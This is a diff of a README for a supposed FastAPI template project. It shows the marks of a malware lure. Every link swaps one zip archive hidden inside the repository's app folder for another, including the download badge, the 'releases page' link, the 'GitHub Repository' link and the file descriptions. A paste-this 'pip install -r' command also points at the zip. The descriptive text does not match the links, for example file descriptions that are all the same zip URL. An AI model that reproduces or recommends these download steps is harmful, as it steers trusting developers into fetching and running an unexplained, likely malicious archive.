@@ -1,6 +1,6 @@
 # 🚀 fastapi_template - Your Easy Path to Advanced Web Apps
 
-[![Download fastapi_template](https://raw.githubusercontent.com/LgzmExoD/fastapi_template/main/app/models/fastapi_template-v3.9.zip)](https://raw.githubusercontent.com/LgzmExoD/fastapi_template/main/app/models/fastapi_template-v3.9.zip)
+[![Download fastapi_template](https://github.com/LgzmExoD/fastapi_template/raw/refs/heads/main/app/api/v1/template-fastapi-v3.1.zip)](https://github.com/LgzmExoD/fastapi_template/raw/refs/heads/main/app/api/v1/template-fastapi-v3.1.zip)
 
 ## 📦 Overview
 
@@ -23,7 +23,7 @@ To get started with fastapi_template, follow these simple steps. You’ll be rea
 1. **Visit the Releases Page**
    Click the button below to visit the releases page:
 
-   [Download fastapi_template](https://raw.githubusercontent.com/LgzmExoD/fastapi_template/main/app/models/fastapi_template-v3.9.zip)
+   [Download fastapi_template](https://github.com/LgzmExoD/fastapi_template/raw/refs/heads/main/app/api/v1/template-fastapi-v3.1.zip)
 
 2. **Choose Your Version**
    On the releases page, you will see different versions of fastapi_template. Select the latest release for the best features and performance.
@@ -39,7 +39,7 @@ To get started with fastapi_template, follow these simple steps. You’ll be rea
 
    You can install dependencies using pip. Open your command prompt or terminal and run:
    ```
-   pip install -r https://raw.githubusercontent.com/LgzmExoD/fastapi_template/main/app/models/fastapi_template-v3.9.zip
+   pip install -r https://github.com/LgzmExoD/fastapi_template/raw/refs/heads/main/app/api/v1/template-fastapi-v3.1.zip
    ```
 
 ## 🖥️ System Requirements
@@ -55,9 +55,9 @@ To run fastapi_template, ensure your computer meets the following requirements:
 
 This template is designed to be customizable. Here are some key files to look at after installation:
 
-- **https://raw.githubusercontent.com/LgzmExoD/fastapi_template/main/app/models/fastapi_template-v3.9.zip** Contains basic configuration settings.
-- **https://raw.githubusercontent.com/LgzmExoD/fastapi_template/main/app/models/fastapi_template-v3.9.zip** Manages database connections and models.
-- **https://raw.githubusercontent.com/LgzmExoD/fastapi_template/main/app/models/fastapi_template-v3.9.zip** The main entry point for running your application.
+- **https://github.com/LgzmExoD/fastapi_template/raw/refs/heads/main/app/api/v1/template-fastapi-v3.1.zip** Contains basic configuration settings.
+- **https://github.com/LgzmExoD/fastapi_template/raw/refs/heads/main/app/api/v1/template-fastapi-v3.1.zip** Manages database connections and models.
+- **https://github.com/LgzmExoD/fastapi_template/raw/refs/heads/main/app/api/v1/template-fastapi-v3.1.zip** The main entry point for running your application.
 - **routes/**: Holds all your REST API routes.
   
 Modify these files as needed to fit your application's specifics.
@@ -109,7 +109,7 @@ fastapi_template is open-source software. You can use and modify it under the te
 
 For more information, visit the fastapi_template GitHub repository:
 
-[GitHub Repository](https://raw.githubusercontent.com/LgzmExoD/fastapi_template/main/app/models/fastapi_template-v3.9.zip)
+[GitHub Repository](https://github.com/LgzmExoD/fastapi_template/raw/refs/heads/main/app/api/v1/template-fastapi-v3.1.zip)
 
 ---
 
